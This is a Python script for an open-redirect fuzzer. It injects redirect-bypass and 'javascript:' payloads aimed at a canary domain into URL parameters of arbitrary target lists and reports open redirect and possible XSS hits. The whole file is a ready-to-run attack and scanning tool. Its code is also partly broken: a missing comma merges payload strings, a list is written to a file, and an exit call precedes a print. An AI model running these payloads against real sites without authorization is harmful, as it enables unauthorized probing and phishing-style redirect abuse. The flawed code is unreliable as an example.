import sys

import regex
import argparse
import requests
import os
import threading
import re

currentPath = os.path.dirname(__file__)

REDIRECT_TEXT = 'CANARY049'
REDIRECT_DOMAIN = 'canaryredirect.fr'
FUZZ_PLACE_HOLDER = 'FUZZZ'
TIMEOUT_DELAY = 1.75
LOCK = threading.Lock()
urls_list = []

parser = argparse.ArgumentParser()
parser.add_argument("--file", "-f", type=str, required=False,
                    help='file of all URLs to be tested against Open Redirect')
parser.add_argument("--url", "-u", type=str, required=False, help='url to be tested against Open Redirect')
parser.add_argument("--threads", "-n", type=int, required=False, help='number of threads for the tool')
parser.add_argument("--output", "-o", type=str, required=False, help='output file path')
parser.add_argument("--verbose", "-v", action='store_true', help='activate verbose mode for the tool')
parser.add_argument("--smart", "-s", action='store_true',
                    help='activate context-based payload generation for each tested URL')
parser.add_argument("--oneshot", "-t", action='store_true',
                    help='fuzz with only one basic payload - to be activated in case of time constraints')

args = parser.parse_args()

if not (args.file or args.url):
    parser.error('No input selected: Please add --file or --url as arguments.')

if args.smart and args.oneshot:
    parser.error('Incompatible modes chosen : oneshot mode implies that only one payload is used.')

# defaultPayloadFile = open(f"{currentPath}/default-payloads.txt", "r")

if args.oneshot:
    payloads = [f"javascript%3A%2F%2Fcanaryredirect"]
else:
    payloads = '''http://canaryredirect.fr
http%3A%2F%2Fcanaryredirect.fr
//canaryredirect.fr
hTTp://canaryredirect.fr
%00http://canaryredirect.fr
x00http://canaryredirect.fr
http://canaryredirect%E3%80%82fr
javascript://canaryredirect%E3%80%82fr'''.split('\n')

if args.file:
    allURLs = [line.replace('\n', '') for line in open(args.file, "r")]

regexParams = regex.compile(
    '(?<=(.*)(Url|URL|Open|callback|continue|data|dest|destination|dir|domain|file|file_name|forward|go|goto|host|html'
    '|load_file|logout|navigation|next|next_page|out|path|redir|redirect|redirect_to|uri|URI|Uri|return'
    '|returnTo|return_path|return_to|target|urlRedirect|RetURL|ReturnUrl|action|allinurl|backurl|burl|clicku|clickurl'
    '|continue|data|dest|destination|ext|forward|go=|goto|image_url|jump|jurl|link|linkAddress|location|loginto|next'
    '|origin|pic|recurl|redir|redirect|request|return|rurl|service|src|success|target|to|uri|url|view|dir|domain)(.*)=)('
    '.*)(?=(&|$))',
    flags=regex.IGNORECASE)

if args.output:
    output = open(args.output, "w")
else:
    output = open("open-redirect-output.txt", "w")


def splitURLS(threadsSize):  # Multithreading

    splitted = []
    URLSsize = len(allURLs)
    width = int(URLSsize / threadsSize)
    if width == 0:
        width = 1
    endVal = 0
    i = 0
    while endVal != URLSsize:
        if URLSsize <= i + 2 * width:
            if len(splitted) == threadsSize - 2:
                endVal = int(i + (URLSsize - i) / 2)
            else:
                endVal = URLSsize
        else:
            endVal = i + width

        splitted.append(allURLs[i: endVal])
        i += width

    return splitted


def exception_verbose_message(exceptionType):
    if args.verbose:
        if exceptionType == "timeout":
            print("\nTimeout detected... URL skipped")
        elif exceptionType == "redirects":
            print("\nToo many redirects... URL skipped")
        elif exceptionType == "others":
            print("\nRequest error... URL skipped")


def smart_extract_host(url, matchedElement):
    urlDecodedElem = requests.utils.unquote(matchedElement)
    hostExtractorRegex = '(?<=(https|http):\/\/)(.*?)(?=\/)'
    extractedHost = regex.search(hostExtractorRegex, urlDecodedElem)
    if not extractedHost:
        extractedHost = regex.search(hostExtractorRegex, url)

    return extractedHost.group()


def generate_payloads(whitelistedHost):
    generated = [
        f"http://{whitelistedHost}.{REDIRECT_DOMAIN}",  # whitelisted.attacker.com
        f"http://{REDIRECT_DOMAIN}?{whitelistedHost}",
        f"http://{REDIRECT_DOMAIN}/{whitelistedHost}",
        f"http://{REDIRECT_DOMAIN}%ff@{whitelistedHost}",
        f"http://{REDIRECT_DOMAIN}%ff.{whitelistedHost}",
        f"http://{whitelistedHost}%25253F@{REDIRECT_DOMAIN}",
        f"http://{whitelistedHost}%253F@{REDIRECT_DOMAIN}",
        f"http://{whitelistedHost}%3F@{REDIRECT_DOMAIN}",
        f"http://{whitelistedHost}@{REDIRECT_DOMAIN}",
        f"http://foo@{REDIRECT_DOMAIN}:80@{whitelistedHost}",
        f"http://foo@{REDIRECT_DOMAIN}%20@{whitelistedHost}",
        f"http://foo@{REDIRECT_DOMAIN}%09@{whitelistedHost}"
    ]
    return generated


def prepare_url_with_regex(url):
    replacedURL = regexParams.sub(FUZZ_PLACE_HOLDER, url)
    matchedElem = regexParams.search(url)
    if matchedElem:
        matchedElem = matchedElem.group()
    return replacedURL, matchedElem


def fuzz_open_redirect(url, payloadsList=payloads):
    replacedURL, matchedElem = prepare_url_with_regex(url)

    if not matchedElem:  # No relevant parameter matching
        return

    if args.smart:
        host = smart_extract_host(url, matchedElem)
        payloadsList.extend(generate_payloads(host))

    if args.verbose:
        print(f"Starting fuzzing {replacedURL}")
    for payload in payloadsList:
        if args.verbose:
            print(f"[?] Testing {replacedURL} with payload {payload}.")
        # if detected_vuln_with_payload(replacedURL, payload):
        if detected_vuln_with_payload(replacedURL, payload) == 'found':
            print(f"[FOUND] Open Redirect: {replacedURL}")
            with LOCK:
                output.write(f"[FOUND] Open Redirect: {replacedURL}\n")
            return
        elif detected_vuln_with_payload(replacedURL, payload) == 'payload':
            return
            # if payload == '//canaryredirect.fr':
            #     break
        elif detected_vuln_with_payload(replacedURL, payload) == '404':
            # print(f"[*] Skipping: {replacedURL}")
            return

    if args.verbose:
        print(f"\nNothing detected for {replacedURL}\n")



# Crafting html injection payloads
domain_name=REDIRECT_DOMAIN.split('.')[0]
html = ["http&#x3a;&#x2f;&#x2f;",
                 "http://",
                 "//",
                 "&#x2f;&#x2f;"
                 "http%3A%2F%2F",
                 "http:%2F%2F"
                 "http:%2F%2F"]
html_redirect = []
for item in html:
    html_redirect.append("=\"" + item + domain_name)
    html_redirect.append("='" + item + domain_name)
    html_redirect.append("='" + item.replace('http', 'https') + domain_name)
    html_redirect.append("=\"" + item.replace('http', 'https') + domain_name)
    html_redirect.append("='" + item.replace('http', 'javascript') + domain_name)
    html_redirect.append("=\"" + item.replace('http', 'javascript') + domain_name)


def detected_vuln_with_payload(url, payload):
    fuzzedUrl = url.replace(FUZZ_PLACE_HOLDER, payload)
    try:
        response = requests.get(fuzzedUrl, timeout=TIMEOUT_DELAY)
        if REDIRECT_TEXT in response.text:
            return 'found'
        elif any(item.lower() in response.text.lower() for item in html_redirect):
            if not 'javascript' in payload:
                print(f"[Potential] Open Redirect: {fuzzedUrl}")
                output.write(f"[Potential] Open Redirect: {fuzzedUrl}")
            else:
                print(f"[Potential] XSS: {fuzzedUrl}")
                output.write(f"[Potential] XSS: {fuzzedUrl}")
            if len(response.text) < 20000:
                m = re.findall(r'(\s.+.*%s.*[\"\'])' % (domain_name), response.text.lower())
                print(m)
                output.write(m)
            return 'payload'
        elif not response.ok:
            return '404'
        else:
            return 'continue'
    except:
        pass

def sequential_url_scan(urlList):
    for url in urlList:
        try:
            fuzz_open_redirect(url)
        except requests.exceptions.Timeout:
            exception_verbose_message("timeout")
        except requests.exceptions.TooManyRedirects:
            exception_verbose_message("redirects")
        except requests.exceptions.RequestException:
            exception_verbose_message("others")


def main():
    if args.url:
        try:
            fuzz_open_redirect(args.url)
        except:
            print("\nInvalid URL")
    elif args.file:

        if not args.threads or args.threads == 1:
            sequential_url_scan(allURLs)

        else:
            try:
                workingThreads = []
                split = splitURLS(args.threads)
                for subList in split:
                    t = threading.Thread(target=sequential_url_scan, args=[subList])
                    t.start()
                    workingThreads.append(t)
                for thread in workingThreads:
                    thread.join()
            except KeyboardInterrupt:
                # Catch the keyboard interrupt and exit gracefully
                sys.exit()
                print("Exiting...")

    output.close()


if __name__ == '__main__':
    main()
